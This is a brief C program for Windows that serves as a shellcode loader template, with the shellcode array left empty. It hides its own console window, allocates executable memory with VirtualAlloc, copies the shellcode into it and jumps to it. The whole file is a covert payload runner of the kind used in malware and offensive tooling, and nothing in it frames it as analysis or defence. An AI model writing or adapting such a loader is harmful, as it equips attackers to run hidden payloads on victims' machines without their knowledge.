#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {

	char shellcode[] = {


	};


	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

}


